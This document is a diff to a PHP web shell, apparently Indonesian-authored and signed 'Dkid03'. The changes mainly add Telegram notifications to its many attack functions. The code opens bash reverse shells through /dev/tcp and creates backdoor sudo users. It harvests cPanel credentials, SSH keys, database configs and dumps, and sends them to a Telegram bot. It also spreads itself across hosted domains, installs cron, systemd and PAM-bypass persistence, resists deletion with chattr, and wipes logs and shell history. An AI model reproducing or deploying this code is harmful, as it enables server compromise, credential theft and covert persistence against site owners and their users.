@@ -1,6 +1,7 @@
 <?php
-// ==================== FORCE SELF-DESTRUCT VIA URL ====================
-if (isset($_GET['kill']) && $_GET['kill'] === 'dkd2025') {
+//Maker: Dkid03
+//Don't change the author 
+if (isset($_GET['kill']) && $_GET['kill'] === 'dkid03') {
     $file = __FILE__;
     if (function_exists('shell_exec')) {
         @shell_exec("chattr -i " . escapeshellarg($file) . " 2>/dev/null");
@@ -13,7 +14,7 @@ if (isset($_GET['kill']) && $_GET['kill'] === 'dkd2025') {
     }
     @chmod($file, 0777);
     @unlink($file);
-    echo "✅ Self-destruct executed!";
+    echo "Self-destruct executed!";
     exit;
 }
 
@@ -478,7 +479,7 @@ function get_all_domains_by_ip_cached($ttl = 300) {
     return $domains;
 }
 
-// ==================== ANTI-DELETE ULTIMATE ====================
+// ==================== ANTI-DELETE ULTIMATE (DENGAN NOTIFIKASI RESTORE) ====================
 function anti_delete_ultimate() {
     global $botToken, $telegramUserId;
     $currentFile = __FILE__;
@@ -520,6 +521,7 @@ function anti_delete_ultimate() {
                     @shell_exec("chattr +i " . escapeshellarg($backup) . " 2>/dev/null");
                 }
                 
+                // ===== KIRIM NOTIFIKASI RESTORE KE TELEGRAM =====
                 $fileInfo = get_file_location();
                 $domain = get_current_domain();
                 $scriptName = basename($currentFile);
@@ -533,7 +535,7 @@ function anti_delete_ultimate() {
                          . "🕐 Time: " . date('Y-m-d H:i:s') . "\n\n"
                          . "⚠️ File telah dipulihkan dari backup!";
                 
-                sendTelegramMessage($GLOBALS['botToken'], $GLOBALS['telegramUserId'], $message);
+                sendTelegramMessage($botToken, $telegramUserId, $message);
                 return true;
             }
         }
@@ -602,7 +604,6 @@ function worm_spread_to_domains($currentFile) {
     $domains = get_all_domains_by_ip_cached(); 
     $roots = get_all_document_roots_cached();
     $myFile = basename($currentFile);
-    $docRoot = $_SERVER['DOCUMENT_ROOT'] ?? '';
     
     if (empty($domains)) {
         $domains = [];
@@ -635,20 +636,6 @@ function worm_spread_to_domains($currentFile) {
             } else {
                 $domainLinks[] = "http://{$domain}/{$myFile} (exists)";
             }
-        } else {
-            foreach ($roots as $root) {
-                if (is_dir($root) && is_writable($root)) {
-                    $targetFile = $root . '/' . $myFile;
-                    if (!file_exists($targetFile)) {
-                        if (@copy($currentFile, $targetFile)) {
-                            @chmod($targetFile, 0644);
-                            $infected[] = $root;
-                            $domainLinks[] = "📁 {$root}/{$myFile} (via root)";
-                            break;
-                        }
-                    }
-                }
-            }
         }
     }
     
@@ -657,7 +644,10 @@ function worm_spread_to_domains($currentFile) {
          . "✅ Berhasil: " . count($infected) . "\n"
          . "❌ Gagal: " . count($errors) . "\n\n";
     if (!empty($domainLinks)) {
-        $msg .= "📁 *Results:*\n" . implode("\n", $domainLinks);
+        $msg .= "📁 *Results:*\n" . implode("\n", array_slice($domainLinks, 0, 20));
+        if (count($domainLinks) > 20) {
+            $msg .= "\n... dan " . (count($domainLinks) - 20) . " lainnya";
+        }
     }
     sendTelegramMessage($botToken, $telegramUserId, $msg);
     return $infected;
@@ -1124,7 +1114,10 @@ function cpanel_harvest() {
             }
         }
     }
-    if (empty($found)) { sendTelegramMessage($botToken, $telegramUserId, "❌ Tidak ditemukan kredensial."); return []; }
+    if (empty($found)) { 
+        sendTelegramMessage($botToken, $telegramUserId, "❌ Tidak ditemukan kredensial."); 
+        return []; 
+    }
     $msg = "🔑 *Credential Harvest Results*\n\n" . implode("\n", $found);
     sendTelegramMessage($botToken, $telegramUserId, $msg);
     return $found;
@@ -1132,38 +1125,53 @@ function cpanel_harvest() {
 
 // ==================== BACKDOOR USER ====================
 function create_backdoor_user($username, $password) {
+    global $botToken, $telegramUserId;
     if (!function_exists('shell_exec')) return "❌ shell_exec tidak tersedia";
     $output = @shell_exec("useradd -m -s /bin/bash " . escapeshellarg($username) . " 2>&1");
-    if (strpos($output, 'exists') !== false) return "⚠️ User $username sudah ada.";
+    if (strpos($output, 'exists') !== false) {
+        $msg = "⚠️ User $username sudah ada.";
+        sendTelegramMessage($botToken, $telegramUserId, $msg);
+        return $msg;
+    }
     @shell_exec("echo '" . escapeshellarg($username) . ":" . escapeshellarg($password) . "' | chpasswd 2>&1");
     @shell_exec("usermod -aG sudo " . escapeshellarg($username) . " 2>&1");
     @shell_exec("usermod -aG wheel " . escapeshellarg($username) . " 2>&1");
     $uid = @shell_exec("id -u " . escapeshellarg($username) . " 2>&1");
-    return "✅ User $username created\nPassword: $password\nUID: $uid";
+    $msg = "✅ User $username created\nPassword: $password\nUID: $uid";
+    sendTelegramMessage($botToken, $telegramUserId, $msg);
+    return $msg;
 }
 
 // ==================== REVERSE SHELL ====================
 function start_reverse_shell($ip, $port) {
+    global $botToken, $telegramUserId;
     if (!function_exists('shell_exec')) return "❌ shell_exec tidak tersedia";
     $script = "/tmp/rshell_$port.sh";
     $content = "#!/bin/bash\nbash -i >& /dev/tcp/$ip/$port 0>&1\n";
     @file_put_contents($script, $content);
     @chmod($script, 0755);
     @shell_exec("nohup " . escapeshellarg($script) . " > /dev/null 2>&1 &");
-    sendTelegramMessage($GLOBALS['botToken'], $GLOBALS['telegramUserId'], "✅ Reverse shell ke $ip:$port dimulai");
+    $msg = "✅ Reverse shell ke $ip:$port dimulai";
+    sendTelegramMessage($botToken, $telegramUserId, $msg);
     return true;
 }
 
 function stop_reverse_shell($port) {
+    global $botToken, $telegramUserId;
     if (!function_exists('shell_exec')) return "❌ shell_exec tidak tersedia";
     @shell_exec("pkill -f 'rshell_$port' 2>/dev/null");
-    return "✅ Reverse shell port $port dihentikan";
+    $msg = "✅ Reverse shell port $port dihentikan";
+    sendTelegramMessage($botToken, $telegramUserId, $msg);
+    return $msg;
 }
 
 function status_reverse_shell() {
+    global $botToken, $telegramUserId;
     if (!function_exists('shell_exec')) return "❌ shell_exec tidak tersedia";
     $output = @shell_exec("ps aux | grep rshell_ | grep -v grep");
-    return empty($output) ? "❌ Tidak ada reverse shell aktif" : "✅ Reverse shell aktif:\n$output";
+    $msg = empty($output) ? "❌ Tidak ada reverse shell aktif" : "✅ Reverse shell aktif:\n$output";
+    sendTelegramMessage($botToken, $telegramUserId, $msg);
+    return $msg;
 }
 
 // ==================== SSH KEYS GRABBER ====================
@@ -1186,7 +1194,10 @@ function grab_ssh_keys() {
             if (!empty(trim($content))) { $keys[] = "👤 User: root\n" . $content; }
         }
     }
-    if (empty($keys)) { sendTelegramMessage($botToken, $telegramUserId, "❌ Tidak ditemukan SSH keys."); return []; }
+    if (empty($keys)) { 
+        sendTelegramMessage($botToken, $telegramUserId, "❌ Tidak ditemukan SSH keys."); 
+        return []; 
+    }
     $msg = "🔑 *SSH Keys Found*\n\n" . implode("\n\n", $keys);
     sendTelegramMessage($botToken, $telegramUserId, $msg);
     return $keys;
@@ -1239,7 +1250,10 @@ function scan_wordpress_laravel() {
             $found[] = implode("\n", $creds);
         }
     }
-    if (empty($found)) { sendTelegramMessage($botToken, $telegramUserId, "❌ Tidak ditemukan WordPress/Laravel."); return []; }
+    if (empty($found)) { 
+        sendTelegramMessage($botToken, $telegramUserId, "❌ Tidak ditemukan WordPress/Laravel."); 
+        return []; 
+    }
     $msg = "📊 *WordPress/Laravel Scan Results*\n\n" . implode("\n\n", $found);
     sendTelegramMessage($botToken, $telegramUserId, $msg);
     return $found;
@@ -1251,13 +1265,14 @@ function create_ransomware() {
     $code = '<?php
 echo "💀 RANSOMWARE DKD03\n";
 echo "File terenkripsi: " . $_SERVER["DOCUMENT_ROOT"] . "\n";
-echo "Password: Dkd03Ransom2025\n";
+echo "Password: Dkid@123\n";
 ?>';
     $file = __DIR__ . '/R.php';
     @file_put_contents($file, $code);
     @chmod($file, 0644);
     $url = "http://" . ($_SERVER['HTTP_HOST'] ?? 'localhost') . "/R.php";
-    sendTelegramMessage($botToken, $telegramUserId, "💀 Ransomware created:\n📁 $file\n🔗 $url");
+    $msg = "💀 Ransomware created:\n📁 $file\n🔗 $url";
+    sendTelegramMessage($botToken, $telegramUserId, $msg);
     return true;
 }
 
@@ -1285,7 +1300,10 @@ function find_sensitive_files() {
             }
         }
     }
-    if (empty($found)) { sendTelegramMessage($botToken, $telegramUserId, "❌ Tidak ditemukan file sensitif."); return []; }
+    if (empty($found)) { 
+        sendTelegramMessage($botToken, $telegramUserId, "❌ Tidak ditemukan file sensitif."); 
+        return []; 
+    }
     $msg = "🔍 *Sensitive Files Found*\n\n" . implode("\n", $found);
     sendTelegramMessage($botToken, $telegramUserId, $msg);
     return $found;
@@ -1353,7 +1371,10 @@ function dump_databases() {
             }
         }
     }
-    if (empty($found_configs) && empty($results)) { sendTelegramMessage($botToken, $telegramUserId, "❌ Tidak ditemukan database atau kredensial."); return []; }
+    if (empty($found_configs) && empty($results)) { 
+        sendTelegramMessage($botToken, $telegramUserId, "❌ Tidak ditemukan database atau kredensial."); 
+        return []; 
+    }
     $msg = "💾 *DATABASE DUMP*\n\n";
     if (!empty($found_configs)) $msg .= "📋 *Config Files Found:*\n" . implode("\n", $found_configs);
     if (!empty($results)) $msg .= "\n\n📁 *Dump Files:*\n" . implode("\n", $results);
@@ -1507,6 +1528,7 @@ WantedBy=multi-user.target';
 }
 
 function remove_deep_persistence() {
+    global $botToken, $telegramUserId;
     @shell_exec('systemctl stop dkd.service 2>/dev/null');
     @shell_exec('systemctl disable dkd.service 2>/dev/null');
     @unlink('/etc/systemd/system/dkd.service');
@@ -1517,7 +1539,9 @@ function remove_deep_persistence() {
         $rc = preg_replace('/--daemon.*\n/', '', $rc);
         @file_put_contents('/etc/rc.local', $rc);
     }
-    return ['success' => true, 'msg' => "✅ Deep persistence removed"];
+    $msg = "✅ Deep persistence removed";
+    sendTelegramMessage($botToken, $telegramUserId, $msg);
+    return ['success' => true, 'msg' => $msg];
 }
 
 // ==================== PAM BYPASS ====================
@@ -1552,6 +1576,7 @@ function pam_bypass_install($password = 'BackdoorPass123') {
 }
 
 function pam_bypass_remove() {
+    global $botToken, $telegramUserId;
     $pam_files = ['/etc/pam.d/common-auth', '/etc/pam.d/sshd', '/etc/pam.d/login', '/etc/pam.d/system-auth'];
     foreach ($pam_files as $file) {
         if (file_exists($file) && is_writable($file)) {
@@ -1560,7 +1585,9 @@ function pam_bypass_remove() {
             @file_put_contents($file, $content);
         }
     }
-    return ['success' => true, 'msg' => "✅ PAM bypass removed"];
+    $msg = "✅ PAM bypass removed";
+    sendTelegramMessage($botToken, $telegramUserId, $msg);
+    return ['success' => true, 'msg' => $msg];
 }
 
 // ==================== USER PERSISTENCE ====================
@@ -1591,6 +1618,7 @@ function user_persistence_install() {
 }
 
 function user_persistence_remove() {
+    global $botToken, $telegramUserId;
     $home = getenv('HOME') ?: __DIR__;
     $bashrc = $home . '/.bashrc';
     if (file_exists($bashrc) && is_writable($bashrc)) {
@@ -1607,7 +1635,9 @@ function user_persistence_remove() {
         @file_put_contents($profile, $content);
     }
     @shell_exec('crontab -l 2>/dev/null | grep -v "' . __FILE__ . '" | crontab -');
-    return ['success' => true, 'msg' => "✅ User persistence removed"];
+    $msg = "✅ User persistence removed";
+    sendTelegramMessage($botToken, $telegramUserId, $msg);
+    return ['success' => true, 'msg' => $msg];
 }
 
 // ==================== LIST SPREAD FILES ====================
@@ -1620,7 +1650,10 @@ function list_spread_files() {
         $path = $root . '/' . $myFile;
         if (file_exists($path)) { $found[] = $path; }
     }
-    if (empty($found)) { sendTelegramMessage($botToken, $telegramUserId, "❌ Tidak ada file spread ditemukan."); return []; }
+    if (empty($found)) { 
+        sendTelegramMessage($botToken, $telegramUserId, "❌ Tidak ada file spread ditemukan."); 
+        return []; 
+    }
     $msg = "📋 *Spread Files*\n\n" . implode("\n", $found);
     sendTelegramMessage($botToken, $telegramUserId, $msg);
     return $found;
@@ -1628,6 +1661,7 @@ function list_spread_files() {
 
 // ==================== CLEAR LOGS ADVANCED ====================
 function clean_logs_advanced() {
+    global $botToken, $telegramUserId;
     $logs = [
         '/var/log/apache2/access.log', '/var/log/apache2/error.log',
         '/var/log/nginx/access.log', '/var/log/nginx/error.log',
@@ -1646,7 +1680,9 @@ function clean_logs_advanced() {
         @shell_exec('history -c 2>/dev/null');
         @shell_exec('unset HISTFILE 2>/dev/null');
     }
-    return "✅ Logs cleaned ($count files) + history cleared";
+    $msg = "✅ Logs cleaned ($count files) + history cleared";
+    sendTelegramMessage($botToken, $telegramUserId, $msg);
+    return $msg;
 }
 
 // ==================== ONE CLICK ALL ====================
@@ -1808,7 +1844,7 @@ function one_click_all() {
     // ===== SELF-DESTRUCTION =====
     $current_file = __FILE__;
     
-    // 1. Hapus semua backup
+    // Hapus semua backup
     $backup_patterns = [
         dirname(__DIR__) . '/.cache/*.inc',
         '/tmp/*' . md5($current_file) . '*.inc',
@@ -1833,7 +1869,7 @@ function one_click_all() {
         }
     }
     
-    // 2. Hapus cron
+    // Hapus cron
     if (function_exists('shell_exec')) {
         @shell_exec('crontab -r 2>/dev/null');
         @shell_exec('crontab -l 2>/dev/null | grep -v "' . basename($current_file) . '" | crontab - 2>/dev/null');
@@ -1841,7 +1877,7 @@ function one_click_all() {
         @shell_exec('crontab -l 2>/dev/null | grep -v "system_cache" | crontab - 2>/dev/null');
     }
     
-    // 3. Hapus systemd service
+    // Hapus systemd service
     if (function_exists('shell_exec')) {
         @shell_exec('systemctl stop dkd_cache.service 2>/dev/null');
         @shell_exec('systemctl disable dkd_cache.service 2>/dev/null');
@@ -1851,7 +1887,7 @@ function one_click_all() {
         @shell_exec('systemctl daemon-reload 2>/dev/null');
     }
     
-    // 4. Hapus rc.local
+    // Hapus rc.local
     if (file_exists('/etc/rc.local') && is_writable('/etc/rc.local')) {
         $rc = file_get_contents('/etc/rc.local');
         $rc = preg_replace('/.*' . preg_quote(basename($current_file), '/') . '.*\n/', '', $rc);
@@ -1860,7 +1896,7 @@ function one_click_all() {
         file_put_contents('/etc/rc.local', $rc);
     }
     
-    // 5. Hapus file utama
+    // Hapus file utama
     if (function_exists('shell_exec')) {
         @shell_exec("chattr -i " . escapeshellarg($current_file) . " 2>/dev/null");
         @shell_exec("chattr -a " . escapeshellarg($current_file) . " 2>/dev/null");
@@ -1873,7 +1909,7 @@ function one_click_all() {
     @chmod($current_file, 0777);
     @unlink($current_file);
     
-    // 6. Self-delete script fallback
+    // Self-delete script fallback
     $script = '/tmp/self_del_' . rand(1000, 99999) . '.sh';
     $content = '#!/bin/bash
 sleep 2
@@ -1914,20 +1950,6 @@ if (isset($_GET['worm_infect_all']) && isset($_SESSION['loggedin']) && $_SESSION
 if (isset($_GET['clean']) && isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) {
     clean_traces();
     echo "🧹 Traces cleaned. Check Telegram.";
-    exit;
-}
-
-if (isset($_GET['check_file']) && isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) {
-    $fileInfo = get_file_location();
-    $message = "📋 *FILE INFORMATION*\n\n"
-             . "📁 Nama: <code>" . basename(__FILE__) . "</code>\n"
-             . "📂 Path: <code>" . __FILE__ . "</code>\n"
-             . "🌐 Domain: <code>" . $fileInfo['domain'] . "</code>\n"
-             . "🔗 URL: <a href='" . $fileInfo['url'] . "'>" . $fileInfo['url'] . "</a>\n"
-             . "📅 Last Modified: " . date('Y-m-d H:i:s', filemtime(__FILE__)) . "\n"
-             . "📏 Size: " . formatSize(filesize(__FILE__));
-    sendTelegramMessage($botToken, $telegramUserId, $message);
-    echo "✅ File information sent to Telegram!";
     exit;
 }
 
@@ -2485,7 +2507,6 @@ if (isset($_SESSION['loggedin'])) {
                         <div class="menu-title">⚡ Utility</div>
                         <a href="?terminal" class="menu-item"><i class="fas fa-terminal"></i> Terminal</a>
                         <div class="menu-item" onclick="runClean()"><i class="fas fa-eraser"></i> Clean Traces</div>
-                        <div class="menu-item" onclick="runCheckFile()"><i class="fas fa-info-circle"></i> Check File & Domain</div>
                         <div class="menu-item" onclick="runCache()"><i class="fas fa-sync-alt"></i> Cache Repair</div>
                     </div>
                     
@@ -2707,7 +2728,6 @@ if (isset($_SESSION['loggedin'])) {
             
             // ===== UTILITY =====
             function runClean(){if(confirm('Clean traces?')){fetch('?clean=1').then(r=>r.text()).then(d=>alert(d)).catch(()=>alert('Error'));}}
-            function runCheckFile(){fetch('?check_file=1').then(r=>r.text()).then(d=>alert(d)).catch(()=>alert('Error'));}}
             function runCache(){if(confirm('Cache repair?')){fetch('?cache_repair=1').then(r=>r.text()).then(d=>alert(d)).catch(()=>alert('Error'));}}
             
             // ===== ONE CLICK =====
